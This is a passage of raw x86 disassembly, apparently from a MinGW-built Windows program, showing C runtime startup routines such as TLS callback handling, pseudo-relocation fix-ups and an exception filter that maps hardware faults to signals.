  4017bf:	a1 14 30 40 00       	mov    0x403014,%eax
  4017c4:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4017c7:	a1 18 30 40 00       	mov    0x403018,%eax
  4017cc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4017cf:	ff 15 58 61 40 00    	call   *0x406158
  4017d5:	83 ec 04             	sub    $0x4,%esp
  4017d8:	c7 04 24 c4 40 40 00 	movl   $0x4040c4,(%esp)
  4017df:	ff 15 68 61 40 00    	call   *0x406168
  4017e5:	83 ec 04             	sub    $0x4,%esp
  4017e8:	ff 15 30 61 40 00    	call   *0x406130
  4017ee:	c7 44 24 04 09 04 00 	movl   $0xc0000409,0x4(%esp)
  4017f5:	c0 
  4017f6:	89 04 24             	mov    %eax,(%esp)
  4017f9:	ff 15 60 61 40 00    	call   *0x406160
  4017ff:	83 ec 08             	sub    $0x8,%esp
  401802:	e8 7d 0d 00 00       	call   0x402584
  401807:	90                   	nop
  401808:	90                   	nop
  401809:	90                   	nop
  40180a:	90                   	nop
  40180b:	90                   	nop
  40180c:	90                   	nop
  40180d:	90                   	nop
  40180e:	90                   	nop
  40180f:	90                   	nop
  401810:	83 ec 1c             	sub    $0x1c,%esp
  401813:	8b 44 24 24          	mov    0x24(%esp),%eax
  401817:	85 c0                	test   %eax,%eax
  401819:	74 15                	je     0x401830
  40181b:	83 f8 03             	cmp    $0x3,%eax
  40181e:	74 10                	je     0x401830
  401820:	b8 01 00 00 00       	mov    $0x1,%eax
  401825:	83 c4 1c             	add    $0x1c,%esp
  401828:	c2 0c 00             	ret    $0xc
  40182b:	90                   	nop
  40182c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401830:	8b 54 24 28          	mov    0x28(%esp),%edx
  401834:	89 44 24 04          	mov    %eax,0x4(%esp)
  401838:	8b 44 24 20          	mov    0x20(%esp),%eax
  40183c:	89 54 24 08          	mov    %edx,0x8(%esp)
  401840:	89 04 24             	mov    %eax,(%esp)
  401843:	e8 d8 08 00 00       	call   0x402120
  401848:	b8 01 00 00 00       	mov    $0x1,%eax
  40184d:	83 c4 1c             	add    $0x1c,%esp
  401850:	c2 0c 00             	ret    $0xc
  401853:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401859:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401860:	53                   	push   %ebx
  401861:	83 ec 18             	sub    $0x18,%esp
  401864:	83 3d 0c 30 40 00 02 	cmpl   $0x2,0x40300c
  40186b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40186f:	74 0a                	je     0x40187b
  401871:	c7 05 0c 30 40 00 02 	movl   $0x2,0x40300c
  401878:	00 00 00 
  40187b:	83 f8 02             	cmp    $0x2,%eax
  40187e:	74 11                	je     0x401891
  401880:	83 f8 01             	cmp    $0x1,%eax
  401883:	74 3b                	je     0x4018c0
  401885:	83 c4 18             	add    $0x18,%esp
  401888:	b8 01 00 00 00       	mov    $0x1,%eax
  40188d:	5b                   	pop    %ebx
  40188e:	c2 0c 00             	ret    $0xc
  401891:	bb 30 70 40 00       	mov    $0x407030,%ebx
  401896:	81 fb 30 70 40 00    	cmp    $0x407030,%ebx
  40189c:	74 e7                	je     0x401885
  40189e:	66 90                	xchg   %ax,%ax
  4018a0:	8b 03                	mov    (%ebx),%eax
  4018a2:	85 c0                	test   %eax,%eax
  4018a4:	74 02                	je     0x4018a8
  4018a6:	ff d0                	call   *%eax
  4018a8:	83 c3 04             	add    $0x4,%ebx
  4018ab:	81 fb 30 70 40 00    	cmp    $0x407030,%ebx
  4018b1:	75 ed                	jne    0x4018a0
  4018b3:	83 c4 18             	add    $0x18,%esp
  4018b6:	b8 01 00 00 00       	mov    $0x1,%eax
  4018bb:	5b                   	pop    %ebx
  4018bc:	c2 0c 00             	ret    $0xc
  4018bf:	90                   	nop
  4018c0:	8b 44 24 28          	mov    0x28(%esp),%eax
  4018c4:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4018cb:	00 
  4018cc:	89 44 24 08          	mov    %eax,0x8(%esp)
  4018d0:	8b 44 24 20          	mov    0x20(%esp),%eax
  4018d4:	89 04 24             	mov    %eax,(%esp)
  4018d7:	e8 44 08 00 00       	call   0x402120
  4018dc:	eb a7                	jmp    0x401885
  4018de:	66 90                	xchg   %ax,%ax
  4018e0:	31 c0                	xor    %eax,%eax
  4018e2:	c3                   	ret
  4018e3:	90                   	nop
  4018e4:	90                   	nop
  4018e5:	90                   	nop
  4018e6:	90                   	nop
  4018e7:	90                   	nop
  4018e8:	90                   	nop
  4018e9:	90                   	nop
  4018ea:	90                   	nop
  4018eb:	90                   	nop
  4018ec:	90                   	nop
  4018ed:	90                   	nop
  4018ee:	90                   	nop
  4018ef:	90                   	nop
  4018f0:	83 ec 3c             	sub    $0x3c,%esp
  4018f3:	a1 d4 53 40 00       	mov    0x4053d4,%eax
  4018f8:	dd 44 24 48          	fldl   0x48(%esp)
  4018fc:	dd 44 24 50          	fldl   0x50(%esp)
  401900:	85 c0                	test   %eax,%eax
  401902:	dd 44 24 58          	fldl   0x58(%esp)
  401906:	74 29                	je     0x401931
  401908:	d9 ca                	fxch   %st(2)
  40190a:	8b 54 24 40          	mov    0x40(%esp),%edx
  40190e:	dd 5c 24 18          	fstpl  0x18(%esp)
  401912:	dd 5c 24 20          	fstpl  0x20(%esp)
  401916:	89 54 24 10          	mov    %edx,0x10(%esp)
  40191a:	8b 54 24 44          	mov    0x44(%esp),%edx
  40191e:	dd 5c 24 28          	fstpl  0x28(%esp)
  401922:	89 54 24 14          	mov    %edx,0x14(%esp)
  401926:	8d 54 24 10          	lea    0x10(%esp),%edx
  40192a:	89 14 24             	mov    %edx,(%esp)
  40192d:	ff d0                	call   *%eax
  40192f:	eb 06                	jmp    0x401937
  401931:	dd d8                	fstp   %st(0)
  401933:	dd d8                	fstp   %st(0)
  401935:	dd d8                	fstp   %st(0)
  401937:	83 c4 3c             	add    $0x3c,%esp
  40193a:	c3                   	ret
  40193b:	90                   	nop
  40193c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401940:	8b 44 24 04          	mov    0x4(%esp),%eax
  401944:	a3 d4 53 40 00       	mov    %eax,0x4053d4
  401949:	e9 b6 0c 00 00       	jmp    0x402604
  40194e:	66 90                	xchg   %ax,%ax
  401950:	83 ec 3c             	sub    $0x3c,%esp
  401953:	b9 d0 40 40 00       	mov    $0x4040d0,%ecx
  401958:	8b 44 24 40          	mov    0x40(%esp),%eax
  40195c:	8b 10                	mov    (%eax),%edx
  40195e:	83 ea 01             	sub    $0x1,%edx
  401961:	83 fa 05             	cmp    $0x5,%edx
  401964:	77 07                	ja     0x40196d
  401966:	8b 0c 95 ec 41 40 00 	mov    0x4041ec(,%edx,4),%ecx
  40196d:	dd 40 18             	fldl   0x18(%eax)
  401970:	dd 5c 24 20          	fstpl  0x20(%esp)
  401974:	dd 40 10             	fldl   0x10(%eax)
  401977:	dd 5c 24 18          	fstpl  0x18(%esp)
  40197b:	dd 40 08             	fldl   0x8(%eax)
  40197e:	dd 5c 24 10          	fstpl  0x10(%esp)
  401982:	8b 40 04             	mov    0x4(%eax),%eax
  401985:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401989:	c7 44 24 04 e0 40 40 	movl   $0x4040e0,0x4(%esp)
  401990:	00 
  401991:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401995:	a1 a4 61 40 00       	mov    0x4061a4,%eax
  40199a:	83 c0 40             	add    $0x40,%eax
  40199d:	89 04 24             	mov    %eax,(%esp)
  4019a0:	e8 1f 0c 00 00       	call   0x4025c4
  4019a5:	31 c0                	xor    %eax,%eax
  4019a7:	83 c4 3c             	add    $0x3c,%esp
  4019aa:	c3                   	ret
  4019ab:	90                   	nop
  4019ac:	90                   	nop
  4019ad:	90                   	nop
  4019ae:	90                   	nop
  4019af:	90                   	nop
  4019b0:	db e3                	fninit
  4019b2:	c3                   	ret
  4019b3:	90                   	nop
  4019b4:	90                   	nop
  4019b5:	90                   	nop
  4019b6:	90                   	nop
  4019b7:	90                   	nop
  4019b8:	90                   	nop
  4019b9:	90                   	nop
  4019ba:	90                   	nop
  4019bb:	90                   	nop
  4019bc:	90                   	nop
  4019bd:	90                   	nop
  4019be:	90                   	nop
  4019bf:	90                   	nop
  4019c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4019c4:	c3                   	ret
  4019c5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4019c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4019d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4019d4:	c3                   	ret
  4019d5:	90                   	nop
  4019d6:	90                   	nop
  4019d7:	90                   	nop
  4019d8:	90                   	nop
  4019d9:	90                   	nop
  4019da:	90                   	nop
  4019db:	90                   	nop
  4019dc:	90                   	nop
  4019dd:	90                   	nop
  4019de:	90                   	nop
  4019df:	90                   	nop
  4019e0:	53                   	push   %ebx
  4019e1:	83 ec 18             	sub    $0x18,%esp
  4019e4:	a1 a4 61 40 00       	mov    0x4061a4,%eax
  4019e9:	c7 44 24 08 1b 00 00 	movl   $0x1b,0x8(%esp)
  4019f0:	00 
  4019f1:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4019f8:	00 
  4019f9:	8d 5c 24 24          	lea    0x24(%esp),%ebx
  4019fd:	c7 04 24 04 42 40 00 	movl   $0x404204,(%esp)
  401a04:	83 c0 40             	add    $0x40,%eax
  401a07:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401a0b:	e8 a4 0b 00 00       	call   0x4025b4
  401a10:	8b 44 24 20          	mov    0x20(%esp),%eax
  401a14:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  401a18:	89 44 24 04          	mov    %eax,0x4(%esp)
  401a1c:	a1 a4 61 40 00       	mov    0x4061a4,%eax
  401a21:	83 c0 40             	add    $0x40,%eax
  401a24:	89 04 24             	mov    %eax,(%esp)
  401a27:	e8 50 0b 00 00       	call   0x40257c
  401a2c:	e8 53 0b 00 00       	call   0x402584
  401a31:	eb 0d                	jmp    0x401a40
  401a33:	90                   	nop
  401a34:	90                   	nop
  401a35:	90                   	nop
  401a36:	90                   	nop
  401a37:	90                   	nop
  401a38:	90                   	nop
  401a39:	90                   	nop
  401a3a:	90                   	nop
  401a3b:	90                   	nop
  401a3c:	90                   	nop
  401a3d:	90                   	nop
  401a3e:	90                   	nop
  401a3f:	90                   	nop
  401a40:	57                   	push   %edi
  401a41:	56                   	push   %esi
  401a42:	53                   	push   %ebx
  401a43:	83 ec 30             	sub    $0x30,%esp
  401a46:	8b 35 e0 53 40 00    	mov    0x4053e0,%esi
  401a4c:	85 f6                	test   %esi,%esi
  401a4e:	0f 8e df 00 00 00    	jle    0x401b33
  401a54:	8b 3d e4 53 40 00    	mov    0x4053e4,%edi
  401a5a:	31 db                	xor    %ebx,%ebx
  401a5c:	8d 57 0c             	lea    0xc(%edi),%edx
  401a5f:	90                   	nop
  401a60:	8b 0a                	mov    (%edx),%ecx
  401a62:	39 c1                	cmp    %eax,%ecx
  401a64:	77 0e                	ja     0x401a74
  401a66:	8b 7a 04             	mov    0x4(%edx),%edi
  401a69:	03 4f 08             	add    0x8(%edi),%ecx
  401a6c:	39 c8                	cmp    %ecx,%eax
  401a6e:	0f 82 b8 00 00 00    	jb     0x401b2c
  401a74:	83 c3 01             	add    $0x1,%ebx
  401a77:	83 c2 14             	add    $0x14,%edx
  401a7a:	39 f3                	cmp    %esi,%ebx
  401a7c:	75 e2                	jne    0x401a60
  401a7e:	89 04 24             	mov    %eax,(%esp)
  401a81:	89 c3                	mov    %eax,%ebx
  401a83:	e8 98 08 00 00       	call   0x402320
  401a88:	85 c0                	test   %eax,%eax
  401a8a:	89 c7                	mov    %eax,%edi
  401a8c:	0f 84 de 00 00 00    	je     0x401b70
  401a92:	8d 1c b6             	lea    (%esi,%esi,4),%ebx
  401a95:	8b 35 e4 53 40 00    	mov    0x4053e4,%esi
  401a9b:	c1 e3 02             	shl    $0x2,%ebx
  401a9e:	01 de                	add    %ebx,%esi
  401aa0:	89 46 10             	mov    %eax,0x10(%esi)
  401aa3:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401aa9:	e8 72 09 00 00       	call   0x402420
  401aae:	03 47 0c             	add    0xc(%edi),%eax
  401ab1:	89 46 0c             	mov    %eax,0xc(%esi)
  401ab4:	8d 44 24 14          	lea    0x14(%esp),%eax
  401ab8:	c7 44 24 08 1c 00 00 	movl   $0x1c,0x8(%esp)
  401abf:	00 
  401ac0:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ac4:	a1 e4 53 40 00       	mov    0x4053e4,%eax
  401ac9:	8b 44 18 0c          	mov    0xc(%eax,%ebx,1),%eax
  401acd:	89 04 24             	mov    %eax,(%esp)
  401ad0:	ff 15 70 61 40 00    	call   *0x406170
  401ad6:	83 ec 0c             	sub    $0xc,%esp
  401ad9:	85 c0                	test   %eax,%eax
  401adb:	74 73                	je     0x401b50
  401add:	8b 44 24 28          	mov    0x28(%esp),%eax
  401ae1:	8d 50 fc             	lea    -0x4(%eax),%edx
  401ae4:	83 e2 fb             	and    $0xfffffffb,%edx
  401ae7:	74 3c                	je     0x401b25
  401ae9:	83 e8 40             	sub    $0x40,%eax
  401aec:	83 e0 bf             	and    $0xffffffbf,%eax
  401aef:	74 34                	je     0x401b25
  401af1:	03 1d e4 53 40 00    	add    0x4053e4,%ebx
  401af7:	8b 44 24 14          	mov    0x14(%esp),%eax
  401afb:	8b 54 24 20          	mov    0x20(%esp),%edx
  401aff:	89 43 04             	mov    %eax,0x4(%ebx)
  401b02:	89 53 08             	mov    %edx,0x8(%ebx)
  401b05:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  401b09:	c7 44 24 08 40 00 00 	movl   $0x40,0x8(%esp)
  401b10:	00 
  401b11:	89 54 24 04          	mov    %edx,0x4(%esp)
  401b15:	89 04 24             	mov    %eax,(%esp)
  401b18:	ff 15 6c 61 40 00    	call   *0x40616c
  401b1e:	83 ec 10             	sub    $0x10,%esp
  401b21:	85 c0                	test   %eax,%eax
  401b23:	74 15                	je     0x401b3a
  401b25:	83 05 e0 53 40 00 01 	addl   $0x1,0x4053e0
  401b2c:	83 c4 30             	add    $0x30,%esp
  401b2f:	5b                   	pop    %ebx
  401b30:	5e                   	pop    %esi
  401b31:	5f                   	pop    %edi
  401b32:	c3                   	ret
  401b33:	31 f6                	xor    %esi,%esi
  401b35:	e9 44 ff ff ff       	jmp    0x401a7e
  401b3a:	ff 15 3c 61 40 00    	call   *0x40613c
  401b40:	c7 04 24 74 42 40 00 	movl   $0x404274,(%esp)
  401b47:	89 44 24 04          	mov    %eax,0x4(%esp)
  401b4b:	e8 90 fe ff ff       	call   0x4019e0
  401b50:	a1 e4 53 40 00       	mov    0x4053e4,%eax
  401b55:	8b 44 18 0c          	mov    0xc(%eax,%ebx,1),%eax
  401b59:	89 44 24 08          	mov    %eax,0x8(%esp)
  401b5d:	8b 47 08             	mov    0x8(%edi),%eax
  401b60:	c7 04 24 40 42 40 00 	movl   $0x404240,(%esp)
  401b67:	89 44 24 04          	mov    %eax,0x4(%esp)
  401b6b:	e8 70 fe ff ff       	call   0x4019e0
  401b70:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401b74:	c7 04 24 20 42 40 00 	movl   $0x404220,(%esp)
  401b7b:	e8 60 fe ff ff       	call   0x4019e0
  401b80:	a1 dc 53 40 00       	mov    0x4053dc,%eax
  401b85:	85 c0                	test   %eax,%eax
  401b87:	74 07                	je     0x401b90
  401b89:	c3                   	ret
  401b8a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401b90:	55                   	push   %ebp
  401b91:	89 e5                	mov    %esp,%ebp
  401b93:	57                   	push   %edi
  401b94:	56                   	push   %esi
  401b95:	53                   	push   %ebx
  401b96:	83 ec 3c             	sub    $0x3c,%esp
  401b99:	c7 05 dc 53 40 00 01 	movl   $0x1,0x4053dc
  401ba0:	00 00 00 
  401ba3:	e8 c8 07 00 00       	call   0x402370
  401ba8:	8d 04 80             	lea    (%eax,%eax,4),%eax
  401bab:	8d 04 85 1e 00 00 00 	lea    0x1e(,%eax,4),%eax
  401bb2:	83 e0 f0             	and    $0xfffffff0,%eax
  401bb5:	e8 96 09 00 00       	call   0x402550
  401bba:	c7 05 e0 53 40 00 00 	movl   $0x0,0x4053e0
  401bc1:	00 00 00 
  401bc4:	29 c4                	sub    %eax,%esp
  401bc6:	8d 44 24 1f          	lea    0x1f(%esp),%eax
  401bca:	83 e0 f0             	and    $0xfffffff0,%eax
  401bcd:	a3 e4 53 40 00       	mov    %eax,0x4053e4
  401bd2:	b8 fc 42 40 00       	mov    $0x4042fc,%eax
  401bd7:	2d fc 42 40 00       	sub    $0x4042fc,%eax
  401bdc:	83 f8 07             	cmp    $0x7,%eax
  401bdf:	0f 8e 9b 00 00 00    	jle    0x401c80
  401be5:	83 f8 0b             	cmp    $0xb,%eax
  401be8:	0f 8e 32 01 00 00    	jle    0x401d20
  401bee:	8b 35 fc 42 40 00    	mov    0x4042fc,%esi
  401bf4:	85 f6                	test   %esi,%esi
  401bf6:	0f 85 94 00 00 00    	jne    0x401c90
  401bfc:	8b 1d 00 43 40 00    	mov    0x404300,%ebx
  401c02:	85 db                	test   %ebx,%ebx
  401c04:	0f 85 86 00 00 00    	jne    0x401c90
  401c0a:	8b 0d 04 43 40 00    	mov    0x404304,%ecx
  401c10:	bb 08 43 40 00       	mov    $0x404308,%ebx
  401c15:	85 c9                	test   %ecx,%ecx
  401c17:	0f 84 08 01 00 00    	je     0x401d25
  401c1d:	bb fc 42 40 00       	mov    $0x4042fc,%ebx
  401c22:	8b 43 08             	mov    0x8(%ebx),%eax
  401c25:	83 f8 01             	cmp    $0x1,%eax
  401c28:	0f 85 b2 01 00 00    	jne    0x401de0
  401c2e:	83 c3 0c             	add    $0xc,%ebx
  401c31:	81 fb fc 42 40 00    	cmp    $0x4042fc,%ebx
  401c37:	73 47                	jae    0x401c80
  401c39:	8b 13                	mov    (%ebx),%edx
  401c3b:	8b 4b 04             	mov    0x4(%ebx),%ecx
  401c3e:	8b 82 00 00 40 00    	mov    0x400000(%edx),%eax
  401c44:	8d b1 00 00 40 00    	lea    0x400000(%ecx),%esi
  401c4a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401c4d:	0f b6 43 08          	movzbl 0x8(%ebx),%eax
  401c51:	83 f8 10             	cmp    $0x10,%eax
  401c54:	0f 84 e6 00 00 00    	je     0x401d40
  401c5a:	83 f8 20             	cmp    $0x20,%eax
  401c5d:	0f 84 61 01 00 00    	je     0x401dc4
  401c63:	83 f8 08             	cmp    $0x8,%eax
  401c66:	0f 84 29 01 00 00    	je     0x401d95
  401c6c:	89 44 24 04          	mov    %eax,0x4(%esp)
  401c70:	c7 04 24 d0 42 40 00 	movl   $0x4042d0,(%esp)
  401c77:	e8 64 fd ff ff       	call   0x4019e0
  401c7c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401c80:	8d 65 f4             	lea    -0xc(%ebp),%esp
  401c83:	5b                   	pop    %ebx
  401c84:	5e                   	pop    %esi
  401c85:	5f                   	pop    %edi
  401c86:	5d                   	pop    %ebp
  401c87:	c3                   	ret
  401c88:	90                   	nop
  401c89:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401c90:	bb fc 42 40 00       	mov    $0x4042fc,%ebx
  401c95:	81 fb fc 42 40 00    	cmp    $0x4042fc,%ebx
  401c9b:	73 e3                	jae    0x401c80
  401c9d:	8d 76 00             	lea    0x0(%esi),%esi
  401ca0:	8b 73 04             	mov    0x4(%ebx),%esi
  401ca3:	8b 13                	mov    (%ebx),%edx
  401ca5:	83 c3 08             	add    $0x8,%ebx
  401ca8:	03 96 00 00 40 00    	add    0x400000(%esi),%edx
  401cae:	8d 86 00 00 40 00    	lea    0x400000(%esi),%eax
  401cb4:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  401cb7:	e8 84 fd ff ff       	call   0x401a40
  401cbc:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401cbf:	81 fb fc 42 40 00    	cmp    $0x4042fc,%ebx
  401cc5:	89 86 00 00 40 00    	mov    %eax,0x400000(%esi)
  401ccb:	72 d3                	jb     0x401ca0
  401ccd:	a1 e0 53 40 00       	mov    0x4053e0,%eax
  401cd2:	31 db                	xor    %ebx,%ebx
  401cd4:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  401cd7:	8b 35 6c 61 40 00    	mov    0x40616c,%esi
  401cdd:	85 c0                	test   %eax,%eax
  401cdf:	7f 0d                	jg     0x401cee
  401ce1:	eb 9d                	jmp    0x401c80
  401ce3:	83 c3 01             	add    $0x1,%ebx
  401ce6:	3b 1d e0 53 40 00    	cmp    0x4053e0,%ebx
  401cec:	7d 92                	jge    0x401c80
  401cee:	8b 15 e4 53 40 00    	mov    0x4053e4,%edx
  401cf4:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  401cf7:	8d 04 82             	lea    (%edx,%eax,4),%eax
  401cfa:	8b 10                	mov    (%eax),%edx
  401cfc:	85 d2                	test   %edx,%edx
  401cfe:	74 e3                	je     0x401ce3
  401d00:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  401d04:	89 54 24 08          	mov    %edx,0x8(%esp)
  401d08:	8b 50 08             	mov    0x8(%eax),%edx
  401d0b:	89 54 24 04          	mov    %edx,0x4(%esp)
  401d0f:	8b 40 04             	mov    0x4(%eax),%eax
  401d12:	89 04 24             	mov    %eax,(%esp)
  401d15:	ff d6                	call   *%esi
  401d17:	83 ec 10             	sub    $0x10,%esp
  401d1a:	eb c7                	jmp    0x401ce3
  401d1c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401d20:	bb fc 42 40 00       	mov    $0x4042fc,%ebx
  401d25:	8b 13                	mov    (%ebx),%edx
  401d27:	85 d2                	test   %edx,%edx
  401d29:	0f 85 66 ff ff ff    	jne    0x401c95
  401d2f:	8b 43 04             	mov    0x4(%ebx),%eax
  401d32:	85 c0                	test   %eax,%eax
  401d34:	0f 84 e8 fe ff ff    	je     0x401c22
  401d3a:	e9 56 ff ff ff       	jmp    0x401c95
  401d3f:	90                   	nop
  401d40:	0f b7 81 00 00 40 00 	movzwl 0x400000(%ecx),%eax
  401d47:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  401d4a:	89 c7                	mov    %eax,%edi
  401d4c:	81 cf 00 00 ff ff    	or     $0xffff0000,%edi
  401d52:	66 83 b9 00 00 40 00 	cmpw   $0x0,0x400000(%ecx)
  401d59:	00 
  401d5a:	0f 48 c7             	cmovs  %edi,%eax
  401d5d:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  401d60:	2d 00 00 40 00       	sub    $0x400000,%eax
  401d65:	29 d0                	sub    %edx,%eax
  401d67:	01 c7                	add    %eax,%edi
  401d69:	89 f0                	mov    %esi,%eax
  401d6b:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  401d6e:	e8 cd fc ff ff       	call   0x401a40
  401d73:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  401d77:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401d7a:	66 89 81 00 00 40 00 	mov    %ax,0x400000(%ecx)
  401d81:	83 c3 0c             	add    $0xc,%ebx
  401d84:	81 fb fc 42 40 00    	cmp    $0x4042fc,%ebx
  401d8a:	0f 82 a9 fe ff ff    	jb     0x401c39
  401d90:	e9 38 ff ff ff       	jmp    0x401ccd
  401d95:	0f b6 06             	movzbl (%esi),%eax
  401d98:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  401d9b:	89 c1                	mov    %eax,%ecx
  401d9d:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
  401da3:	80 3e 00             	cmpb   $0x0,(%esi)
  401da6:	0f 48 c1             	cmovs  %ecx,%eax
  401da9:	2d 00 00 40 00       	sub    $0x400000,%eax
  401dae:	29 d0                	sub    %edx,%eax
  401db0:	01 c7                	add    %eax,%edi
  401db2:	89 f0                	mov    %esi,%eax
  401db4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  401db7:	e8 84 fc ff ff       	call   0x401a40
  401dbc:	0f b6 45 e4          	movzbl -0x1c(%ebp),%eax
  401dc0:	88 06                	mov    %al,(%esi)
  401dc2:	eb bd                	jmp    0x401d81
  401dc4:	8b 06                	mov    (%esi),%eax
  401dc6:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  401dc9:	2d 00 00 40 00       	sub    $0x400000,%eax
  401dce:	2b 03                	sub    (%ebx),%eax
  401dd0:	01 c7                	add    %eax,%edi
  401dd2:	89 f0                	mov    %esi,%eax
  401dd4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  401dd7:	e8 64 fc ff ff       	call   0x401a40
  401ddc:	89 3e                	mov    %edi,(%esi)
  401dde:	eb a1                	jmp    0x401d81
  401de0:	89 44 24 04          	mov    %eax,0x4(%esp)
  401de4:	c7 04 24 9c 42 40 00 	movl   $0x40429c,(%esp)
  401deb:	e8 f0 fb ff ff       	call   0x4019e0
  401df0:	55                   	push   %ebp
  401df1:	89 e5                	mov    %esp,%ebp
  401df3:	53                   	push   %ebx
  401df4:	83 ec 14             	sub    $0x14,%esp
  401df7:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401dfa:	8b 03                	mov    (%ebx),%eax
  401dfc:	8b 00                	mov    (%eax),%eax
  401dfe:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  401e03:	77 4b                	ja     0x401e50
  401e05:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  401e0a:	0f 83 b0 00 00 00    	jae    0x401ec0
  401e10:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  401e15:	0f 85 d9 00 00 00    	jne    0x401ef4
  401e1b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401e22:	00 
  401e23:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  401e2a:	e8 6d 07 00 00       	call   0x40259c
  401e2f:	83 f8 01             	cmp    $0x1,%eax
  401e32:	0f 84 18 01 00 00    	je     0x401f50
  401e38:	85 c0                	test   %eax,%eax
  401e3a:	74 2d                	je     0x401e69
  401e3c:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  401e43:	ff d0                	call   *%eax
  401e45:	eb 63                	jmp    0x401eaa
  401e47:	89 f6                	mov    %esi,%esi
  401e49:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401e50:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  401e55:	74 29                	je     0x401e80
  401e57:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  401e5c:	0f 84 9d 00 00 00    	je     0x401eff
  401e62:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  401e67:	74 57                	je     0x401ec0
  401e69:	a1 ec 53 40 00       	mov    0x4053ec,%eax
  401e6e:	85 c0                	test   %eax,%eax
  401e70:	74 3d                	je     0x401eaf
  401e72:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401e75:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401e78:	c9                   	leave
  401e79:	ff e0                	jmp    *%eax
  401e7b:	90                   	nop
  401e7c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401e80:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401e87:	00 
  401e88:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  401e8f:	e8 08 07 00 00       	call   0x40259c
  401e94:	83 f8 01             	cmp    $0x1,%eax
  401e97:	0f 84 d3 00 00 00    	je     0x401f70
  401e9d:	85 c0                	test   %eax,%eax
  401e9f:	74 c8                	je     0x401e69
  401ea1:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  401ea8:	ff d0                	call   *%eax
  401eaa:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401eaf:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401eb2:	c9                   	leave
  401eb3:	c2 04 00             	ret    $0x4
  401eb6:	8d 76 00             	lea    0x0(%esi),%esi
  401eb9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401ec0:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401ec7:	00 
  401ec8:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  401ecf:	e8 c8 06 00 00       	call   0x40259c
  401ed4:	83 f8 01             	cmp    $0x1,%eax
  401ed7:	75 c4                	jne    0x401e9d
  401ed9:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  401ee0:	00 
  401ee1:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  401ee8:	e8 af 06 00 00       	call   0x40259c
  401eed:	e8 be fa ff ff       	call   0x4019b0
  401ef2:	eb b6                	jmp    0x401eaa
  401ef4:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  401ef9:	0f 85 6a ff ff ff    	jne    0x401e69
  401eff:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401f06:	00 
  401f07:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  401f0e:	e8 89 06 00 00       	call   0x40259c
  401f13:	83 f8 01             	cmp    $0x1,%eax
  401f16:	74 18                	je     0x401f30
  401f18:	85 c0                	test   %eax,%eax
  401f1a:	0f 84 49 ff ff ff    	je     0x401e69
  401f20:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  401f27:	ff d0                	call   *%eax
  401f29:	e9 7c ff ff ff       	jmp    0x401eaa
